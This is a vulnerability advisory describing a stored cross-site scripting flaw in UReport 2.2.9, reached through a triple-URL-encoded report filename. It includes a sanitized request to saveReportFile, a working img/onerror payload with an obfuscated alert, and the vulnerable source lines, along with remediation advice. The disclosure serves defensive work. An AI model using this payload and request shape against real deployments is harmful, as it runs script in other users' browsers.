# UReport report-filename stored XSS in two views

## Summary

saveReportFile double-decodes and persists an unrestricted filename. The name is later inserted as HTML by OpenDialog and into an inline JavaScript string by the preview template.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated report author; victim opens the report list or previews the crafted stored report.

Verified flow: `triple-encoded report filename -> decodeFileName() -> database -> OpenDialog HTML / preview inline JavaScript`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Save a minimal report using a triple-encoded filename carrying HTML or JavaScript-string syntax.
2. Confirm the decoded filename is returned by loadReportProviders and persisted.
3. Open the designer report list or the matching preview and inspect the corresponding HTML/inline-script Sink.

Sanitized request shape used during verification:

```http
POST <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>

file=URLENCODE×3("blade-fnlf<img ... gt48261022n3c>.ureport.xml")
content=URLENCODE×2(<MINIMAL_REPORT_XML>)

GET <BASE_URL>/blade-report/ureport/designer/loadReportProviders
# Victim opens the designer Open dialog.

# Inline-JS variant uses a stored quote-breaking filename and previews it by name.
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `n3a / r41a` | raw name in HTML and JS | **PASS** |
| 2 | `n3b / r41b` | raw name in HTML and JS | **PASS** |
| 3 | `n3c / r41c` | raw name in HTML and JS | **PASS** |

```text
Run-3 provider JSON name:
fnlf<img src=x onerror=self[`al`+`ert`](`gt48261022n3c`)>.ureport.xml

Run-3 preview script contains the second crafted filename directly in submitSearchForm("${file}", ...).
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
DesignerServletAction.java:163-187
file = ReportUtils.decodeFileName(file);
reportProvider.saveReport(file, content);
return loadReportProviders();

OpenDialog.js:59
tr.append(`<td style="vertical-align: middle;">${file.name}</td>`);

ureport-html/html-preview.html:123
submitSearchForm("${file}","${customParameters}");
```

Root cause: Unrestricted decoded filenames become persistent application data and are reused in both HTML and JavaScript contexts without the encoding required by either context.

## Recommended remediation

Enforce a conservative filename grammar before storage and apply separate HTML-text and JavaScript-string encoders at the two output Sinks.

## References

- Official source: https://github.com/youseries/ureport

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-07 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-07/01-reproduction-v2.png)

### Three-run success proof

![CAN-07 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-07/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-07 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-07/03-source-sink-v2.png)
